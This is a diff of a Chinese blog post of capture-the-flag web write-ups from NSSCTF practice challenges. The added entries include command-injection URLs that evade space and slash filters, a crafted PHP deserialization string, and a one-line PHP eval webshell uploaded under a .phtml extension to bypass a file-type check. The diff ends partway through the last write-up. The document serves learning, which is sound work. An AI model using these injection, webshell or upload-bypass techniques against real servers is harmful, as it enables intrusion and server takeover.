@@ -20,12 +20,12 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"czchenzhan.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":true,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":"ture","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
 
-    <meta name="description" content="解题思路记录&emsp;&emsp;博主按题目分数从低到高的顺序尝试NSSCTF-Web板块，并记录心得如下！">
+    <meta name="description" content="解题思路记录&emsp;&emsp;博主按NSSCTF-Web板块的顺序进行Web练习，并记录心得如下！">
 <meta property="og:type" content="article">
 <meta property="og:title" content="NSSCTF-Web做题笔记">
 <meta property="og:url" content="https://czchenzhan.github.io/2024/11/07/NSSCTF-Web%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/index.html">
 <meta property="og:site_name" content="陈展的博客">
-<meta property="og:description" content="解题思路记录&emsp;&emsp;博主按题目分数从低到高的顺序尝试NSSCTF-Web板块，并记录心得如下！">
+<meta property="og:description" content="解题思路记录&emsp;&emsp;博主按NSSCTF-Web板块的顺序进行Web练习，并记录心得如下！">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://czchenzhan.github.io/2024/11/07/NSSCTF-Web%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/382_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png">
 <meta property="og:image" content="https://czchenzhan.github.io/2024/11/07/NSSCTF-Web%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/384_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png">
@@ -44,8 +44,26 @@
 <meta property="og:image" content="https://czchenzhan.github.io/2024/11/07/NSSCTF-Web%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/385_a.php%E8%AE%BF%E9%97%AE.png">
 <meta property="og:image" content="https://czchenzhan.github.io/2024/11/07/NSSCTF-Web%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/385_IP%E4%BF%AE%E6%94%B9.png">
 <meta property="og:image" content="https://czchenzhan.github.io/2024/11/07/NSSCTF-Web%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/385_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png">
+<meta property="og:image" content="https://czchenzhan.github.io/2024/11/07/NSSCTF-Web%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/425_%E6%96%B0%E6%96%87%E4%BB%B6%E6%8F%90%E7%A4%BA.png">
+<meta property="og:image" content="https://czchenzhan.github.io/2024/11/07/NSSCTF-Web%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/425_%E6%96%B0PHP%E4%BB%A3%E7%A0%81.png">
+<meta property="og:image" content="https://czchenzhan.github.io/2024/11/07/NSSCTF-Web%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/425_%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84.png">
+<meta property="og:image" content="https://czchenzhan.github.io/2024/11/07/NSSCTF-Web%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/425_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png">
+<meta property="og:image" content="https://czchenzhan.github.io/2024/11/07/NSSCTF-Web%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/344_%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E7%BB%93%E6%9E%9C.png">
+<meta property="og:image" content="https://czchenzhan.github.io/2024/11/07/NSSCTF-Web%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/344_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png">
+<meta property="og:image" content="https://czchenzhan.github.io/2024/11/07/NSSCTF-Web%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/426_%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E7%BB%93%E6%9E%9C.png">
+<meta property="og:image" content="https://czchenzhan.github.io/2024/11/07/NSSCTF-Web%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/426_PHP%E4%BB%A3%E7%A0%81%E5%B1%95%E7%A4%BA.png">
+<meta property="og:image" content="https://czchenzhan.github.io/2024/11/07/NSSCTF-Web%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/426_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png">
+<meta property="og:image" content="https://czchenzhan.github.io/2024/11/07/NSSCTF-Web%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/423_%E6%8A%93%E5%8C%85%E4%BF%AE%E6%94%B9%E7%BB%93%E6%9E%9C.png">
+<meta property="og:image" content="https://czchenzhan.github.io/2024/11/07/NSSCTF-Web%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/423_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C.png">
+<meta property="og:image" content="https://czchenzhan.github.io/2024/11/07/NSSCTF-Web%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/423_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png">
+<meta property="og:image" content="https://czchenzhan.github.io/2024/11/07/NSSCTF-Web%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/3865_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png">
+<meta property="og:image" content="https://czchenzhan.github.io/2024/11/07/NSSCTF-Web%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/388_CT%E4%BF%AE%E6%94%B9%E7%BB%93%E6%9E%9C.png">
+<meta property="og:image" content="https://czchenzhan.github.io/2024/11/07/NSSCTF-Web%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/388_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png">
+<meta property="og:image" content="https://czchenzhan.github.io/2024/11/07/NSSCTF-Web%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/3863_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png">
+<meta property="og:image" content="https://czchenzhan.github.io/2024/11/07/NSSCTF-Web%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/429_%E5%8A%A0%E5%AF%86%E7%BB%93%E6%9E%9C.png">
+<meta property="og:image" content="https://czchenzhan.github.io/2024/11/07/NSSCTF-Web%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/429_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png">
 <meta property="article:published_time" content="2024-11-07T07:06:56.732Z">
-<meta property="article:modified_time" content="2024-11-11T09:01:58.308Z">
+<meta property="article:modified_time" content="2024-11-12T08:29:39.763Z">
 <meta property="article:author" content="作者：陈展">
 <meta property="article:tag" content="CTF-Web">
 <meta name="twitter:card" content="summary">
@@ -159,7 +177,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text">解题思路记录</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">1.1.</span> <span class="nav-text">382_[SWPUCTF 2021 新生赛]gift_F12</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">1.2.</span> <span class="nav-text">384_[SWPUCTF 2021 新生赛]jicao</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">1.3.</span> <span class="nav-text">386_[SWPUCTF 2021 新生赛]easy_md5 –弱比较 –数组绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">1.4.</span> <span class="nav-text">427_[SWPUCTF 2021 新生赛]include –PHP伪协议 –文件包含漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">1.5.</span> <span class="nav-text">387_[SWPUCTF 2021 新生赛]easy_sql –字符型注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">1.6.</span> <span class="nav-text">424_[SWPUCTF 2021 新生赛]easyrce –eval() –命令执行函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">1.7.</span> <span class="nav-text">383_[SWPUCTF 2021 新生赛]caidao –同424</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">1.8.</span> <span class="nav-text">3861_[LitCTF 2023]我Flag呢？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">1.9.</span> <span class="nav-text">385_[SWPUCTF 2021 新生赛]Do_you_know_http –HTTP浏览器修改 –HTTP请求IP更改</span></a></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text">解题思路记录</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">1.1.</span> <span class="nav-text">382_[SWPUCTF 2021 新生赛]gift_F12</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">1.2.</span> <span class="nav-text">384_[SWPUCTF 2021 新生赛]jicao</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">1.3.</span> <span class="nav-text">386_[SWPUCTF 2021 新生赛]easy_md5 –弱比较 –数组绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">1.4.</span> <span class="nav-text">427_[SWPUCTF 2021 新生赛]include –PHP伪协议 –文件包含漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">1.5.</span> <span class="nav-text">387_[SWPUCTF 2021 新生赛]easy_sql –字符型注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">1.6.</span> <span class="nav-text">424_[SWPUCTF 2021 新生赛]easyrce –eval() –命令执行函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">1.7.</span> <span class="nav-text">383_[SWPUCTF 2021 新生赛]caidao –同424</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">1.8.</span> <span class="nav-text">3861_[LitCTF 2023]我Flag呢？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">1.9.</span> <span class="nav-text">385_[SWPUCTF 2021 新生赛]Do_you_know_http –HTTP浏览器修改 –HTTP请求IP更改</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">1.10.</span> <span class="nav-text">425_[SWPUCTF 2021 新生赛]babyrce –空格绕过 –&#x2F;绕过 –命令执行函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">1.11.</span> <span class="nav-text">344_[第五空间 2021]WebFTP –目录扫描 –phpinfo()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">1.12.</span> <span class="nav-text">426_[SWPUCTF 2021 新生赛]ez_unserialize –反序列化 –对象反序列化字串解读</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">1.13.</span> <span class="nav-text">423_[SWPUCTF 2021 新生赛]easyupload2.0 –文件上传 –文件后缀绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">1.14.</span> <span class="nav-text">3865_[LitCTF 2023]PHP是世界上最好的语言！！</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">1.15.</span> <span class="nav-text">388_[SWPUCTF 2021 新生赛]easyupload1.0 –文件上传 –phpinfo()直出 –MIME绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">1.16.</span> <span class="nav-text">3863_[LitCTF 2023]导弹迷踪 –不知道怎么评价</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">1.17.</span> <span class="nav-text">429_[SWPUCTF 2021 新生赛]no_wakeup –反序列化 –魔术方法绕过 –__wakeup()绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">1.18.</span> <span class="nav-text">441_[SWPUCTF 2021 新生赛]PseudoProtocols</span></a></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -246,7 +264,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2024-11-11 17:01:58" itemprop="dateModified" datetime="2024-11-11T17:01:58+08:00">2024-11-11</time>
+      <time title="修改时间：2024-11-12 16:29:39" itemprop="dateModified" datetime="2024-11-12T16:29:39+08:00">2024-11-12</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -267,7 +285,7 @@
     
     
     
-    <div class="post-body" itemprop="articleBody"><h1><span id="解题思路记录">解题思路记录</span></h1><p>&emsp;&emsp;博主按题目分数从低到高的顺序尝试NSSCTF-Web板块，并记录心得如下！</p>
+    <div class="post-body" itemprop="articleBody"><h1><span id="解题思路记录">解题思路记录</span></h1><p>&emsp;&emsp;博主按NSSCTF-Web板块的顺序进行Web练习，并记录心得如下！</p>
 <span id="more"></span>
 
 <!-- toc -->
@@ -282,6 +300,15 @@
 <li><a href="#383_swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Bcaidao-%E5%90%8C424">383_[SWPUCTF 2021 新生赛]caidao –同424</a></li>
 <li><a href="#3861_litctf-2023%E6%88%91flag%E5%91%A2">3861_[LitCTF 2023]我Flag呢？</a></li>
 <li><a href="#385_swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Bdo_you_know_http-http%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BF%AE%E6%94%B9-http%E8%AF%B7%E6%B1%82ip%E6%9B%B4%E6%94%B9">385_[SWPUCTF 2021 新生赛]Do_you_know_http –HTTP浏览器修改 –HTTP请求IP更改</a></li>
+<li><a href="#425_swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Bbabyrce-%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87-%E7%BB%95%E8%BF%87-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0">425_[SWPUCTF 2021 新生赛]babyrce –空格绕过 –&#x2F;绕过 –命令执行函数</a></li>
+<li><a href="#344_%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-2021webftp-%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F-phpinfo">344_[第五空间 2021]WebFTP –目录扫描 –phpinfo()</a></li>
+<li><a href="#426_swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Bez_unserialize-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%AF%B9%E8%B1%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E4%B8%B2%E8%A7%A3%E8%AF%BB">426_[SWPUCTF 2021 新生赛]ez_unserialize –反序列化 –对象反序列化字串解读</a></li>
+<li><a href="#423_swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Beasyupload20-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E6%96%87%E4%BB%B6%E5%90%8E%E7%BC%80%E7%BB%95%E8%BF%87">423_[SWPUCTF 2021 新生赛]easyupload2.0 –文件上传 –文件后缀绕过</a></li>
+<li><a href="#3865_litctf-2023php%E6%98%AF%E4%B8%96%E7%95%8C%E4%B8%8A%E6%9C%80%E5%A5%BD%E7%9A%84%E8%AF%AD%E8%A8%80">3865_[LitCTF 2023]PHP是世界上最好的语言！！</a></li>
+<li><a href="#388_swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Beasyupload10-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-phpinfo%E7%9B%B4%E5%87%BA-mime%E7%BB%95%E8%BF%87">388_[SWPUCTF 2021 新生赛]easyupload1.0 –文件上传 –phpinfo()直出 –MIME绕过</a></li>
+<li><a href="#3863_litctf-2023%E5%AF%BC%E5%BC%B9%E8%BF%B7%E8%B8%AA-%E4%B8%8D%E7%9F%A5%E9%81%93%E6%80%8E%E4%B9%88%E8%AF%84%E4%BB%B7">3863_[LitCTF 2023]导弹迷踪 –不知道怎么评价</a></li>
+<li><a href="#429_swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Bno_wakeup-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E7%BB%95%E8%BF%87-__wakeup%E7%BB%95%E8%BF%87">429_[SWPUCTF 2021 新生赛]no_wakeup –反序列化 –魔术方法绕过 –<code>__wakeup()</code>绕过</a></li>
+<li><a href="#441_swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Bpseudoprotocols">441_[SWPUCTF 2021 新生赛]PseudoProtocols</a></li>
 </ul>
 <!-- tocstop -->
 
@@ -475,6 +502,265 @@
 <p>&emsp;&emsp;进入新给出的.php文件，得到flag</p>
 <img src="/2024/11/07/NSSCTF-Web%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/385_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png" class title="385_结果展示">
 
+<h2><span id="425_swpuctf-2021-新生赛babyrce-空格绕过-x2f绕过-命令执行函数">425_[SWPUCTF 2021 新生赛]babyrce –空格绕过 –&#x2F;绕过 –命令执行函数</span></h2><p>&emsp;&emsp;进入环境得到PHP代码，审计发现要求修改cookie，输入admin&#x3D;1，利用HackBar完成，execute执行后得到提示</p>
+<img src="/2024/11/07/NSSCTF-Web%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/425_%E6%96%B0%E6%96%87%E4%BB%B6%E6%8F%90%E7%A4%BA.png" class title="425_新文件提示">
+
+<img src="/2024/11/07/NSSCTF-Web%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/425_%E6%96%B0PHP%E4%BB%A3%E7%A0%81.png" class title="425_新PHP代码">
+
+<p>&emsp;&emsp;进入新的.php文件，审计代码发现命令执行函数shell_exec()，其将结果存于变量中，再输出该变量</p>
+<p>&emsp;&emsp;审计代码还能发现程序将空格与斜杠符”&#x2F;“屏蔽，故需要绕过，这里学到的是通过url编码字符进行绕过，查阅知</p>
+<table>
+<thead>
+<tr>
+<th align="center">字符</th>
+<th align="center">URL编码</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">空格</td>
+<td align="center">%09</td>
+</tr>
+<tr>
+<td align="center">&#x2F;</td>
+<td align="center">%2f</td>
+</tr>
+</tbody></table>
+<p>&emsp;&emsp;故构造shell语句传入参数url中，获取基础信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 获取目录结构</span><br><span class="line">/rasalghul.php?url=ls%09%2f</span><br></pre></td></tr></table></figure>
+
+<img src="/2024/11/07/NSSCTF-Web%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/425_%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84.png" class title="425_目录结构">
+
+<p>&emsp;&emsp;利用cat命令输出目标文件，得到flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 输出目标文件</span><br><span class="line">/rasalghul.php?url=cat%09%2fflllllaaaaaaggggggg</span><br></pre></td></tr></table></figure>
+
+<img src="/2024/11/07/NSSCTF-Web%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/425_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png" class title="425_结果展示">
+
+<h2><span id="344_第五空间-2021webftp-目录扫描-phpinfo">344_[第五空间 2021]WebFTP –目录扫描 –phpinfo()</span></h2><p>&emsp;&emsp;进入环境，无明显提示，F12搜素关键字也无果，对两个输入框初步尝试仍然没有头绪，扫描目录(自己写了个，练练手ʕ ᵔᴥᵔ ʔ)发现线索</p>
+<img src="/2024/11/07/NSSCTF-Web%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/344_%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E7%BB%93%E6%9E%9C.png" class title="344_目录扫描结果">
+
+<p>&emsp;&emsp;结果显示有两个关键文件存在，先查看phpinfo.php，ctrl+F搜索flag关键字得到答案</p>
+<img src="/2024/11/07/NSSCTF-Web%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/344_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png" class title="344_结果展示">
+
+<h2><span id="426_swpuctf-2021-新生赛ez_unserialize-反序列化-对象反序列化字串解读">426_[SWPUCTF 2021 新生赛]ez_unserialize –反序列化 –对象反序列化字串解读</span></h2><p>&emsp;&emsp;进入环境，欣赏半分钟胡桃摇，无果，开始扫描目录 &#x3D;&gt; 嗯？这么快？</p>
+<img src="/2024/11/07/NSSCTF-Web%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/426_%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E7%BB%93%E6%9E%9C.png" class title="426_目录扫描结果">
+
+<p>&emsp;&emsp;对两个关键文件都进行搜索，flag.php为空，robots.txt给出了提示信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /cl45s.php</span><br></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;进入提示.php文件，得到PHP代码，行，没见过反序列化，开始学，以下是据本题所学到的对象序列化字串的格式及解读，日后的日后再说</p>
+<img src="/2024/11/07/NSSCTF-Web%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/426_PHP%E4%BB%A3%E7%A0%81%E5%B1%95%E7%A4%BA.png" class title="426_PHP代码展示">
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 示例</span></span><br><span class="line">?php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;xiaoshizi&quot;</span>;<span class="variable language_">$this</span>-&gt;b=<span class="string">&quot;laoshizi&quot;</span>;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">happy</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;a;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment"># 结果</span></span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot; * a&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;xiaoshizi&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot; test b&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;laoshizi&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th align="center">字符</th>
+<th align="center">解读</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">O:</td>
+<td align="center">表示序列化的元素是对象</td>
+</tr>
+<tr>
+<td align="center">4:</td>
+<td align="center">表示对象的类名为4个字符</td>
+</tr>
+<tr>
+<td align="center">“test”:</td>
+<td align="center">对象的类名</td>
+</tr>
+<tr>
+<td align="center">2:</td>
+<td align="center">表示对象有两个属性</td>
+</tr>
+<tr>
+<td align="center">s:</td>
+<td align="center">第一个属性名，肯定是字符型</td>
+</tr>
+<tr>
+<td align="center">4:</td>
+<td align="center">第一个属性名有4个字符</td>
+</tr>
+<tr>
+<td align="center">“ * a”;</td>
+<td align="center">第一个属性名(见注)</td>
+</tr>
+<tr>
+<td align="center">s:</td>
+<td align="center">第一个属性值的类型</td>
+</tr>
+<tr>
+<td align="center">9:</td>
+<td align="center">第一个属性值有9个字符</td>
+</tr>
+<tr>
+<td align="center">“xiaoshizi”;</td>
+<td align="center">第一个属性值</td>
+</tr>
+<tr>
+<td align="center">s:</td>
+<td align="center">第二个属性名类型</td>
+</tr>
+<tr>
+<td align="center">7:</td>
+<td align="center">第二个属性有7个字符</td>
+</tr>
+<tr>
+<td align="center">“ test b”;</td>
+<td align="center">第二个属性名(见注)</td>
+</tr>
+<tr>
+<td align="center">s:</td>
+<td align="center">第二个属性值为字符型</td>
+</tr>
+<tr>
+<td align="center">8:</td>
+<td align="center">有8个字符</td>
+</tr>
+<tr>
+<td align="center">“laoshizi”;</td>
+<td align="center">第二个属性值</td>
+</tr>
+</tbody></table>
+<p>&emsp;&emsp;<span style="background-color: red;">注：</span>如果变量前是protected，则会在变量名前加上<code>\x00*\x00</code>,private则会在变量名前加上<code>\x00类名\x00</code></p>
+<p>&emsp;&emsp;学完了，再来看题，很明显，以GET方式传入一个序列化字串做参数p即可，手拿把掐</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 序列化元素为对象，类名为wllm，有两个属性</span><br><span class="line">O:4:&quot;wllm&quot;:2:&#123;&#125;</span><br><span class="line"># 第一个属性值为admin才可通过</span><br><span class="line">s:5:&quot;admin&quot;;s:5:&quot;admin&quot;;</span><br><span class="line"># 第一个属性值为ctf才可通过</span><br><span class="line">s:6:&quot;passwd&quot;;s:3:&quot;ctf&quot;;</span><br><span class="line"># 连起来</span><br><span class="line">O:4:&quot;wllm&quot;:2:&#123;s:5:&quot;admin&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:3:&quot;ctf&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;传入参数后得到flag</p>
+<img src="/2024/11/07/NSSCTF-Web%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/426_%E7%BB%93%E6%9E%9C%E5%B1%95%E7%A4%BA.png" class title="426_结果展示">
+
+<h2><span id="423_swpuctf-2021-新生赛easyupload20-文件上传-文件后缀绕过">423_[SWPUCTF 2021 新生赛]easyupload2.0 –文件上传 –文件后缀绕过</span></h2><p>&emsp;&emsp;进入环境，拔剑四顾心茫然ヽ(゜Q。)ノ？，看题目名字，得，先学吧</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 原理：用户上传可执行脚本文件对整个网站甚至服务器进行控制，这个脚本又叫Webshell</span><br><span class="line"># 一句话木马示例</span><br><span class="line">&lt;?php @eval(~);?&gt;       # @用于抑制eval函数的报错，~中填写PHP代码</span><br></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;本地编个.php文件试试看：<code>&lt;?php @eval (system(&quot;ls /&quot;)); ?&gt;</code>，结果返还提示：php是不行滴，看来是被限制了</p>
+<p>&emsp;&emsp;查阅得知，.php文件还可以修改为<span style="background-color: yellow;">.phtml(含PHP代码的.html文件)</span>后缀且不影响功能，用BurpSuite抓包改一下，出现提示</p>
+<img src="/2024/11/07/NSSCTF-Web%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/423_%E6%8A%93%E5%8C%85%E4%BF%AE%E6%94%B9%E7%BB%93%E6%9E%9C.png" class title="423_抓包修改结果">
+
+<p>&emsp;&emsp;进入提示.phtml文件，得到命令执行函数的运行结果</p>
+<img src="/2024/11/07/NSSCTF-Web%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/423_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C.png" class title="423_命令执行结果">
+
+<p>&emsp;&emsp;没有思路，决定先理清目录结构</p>
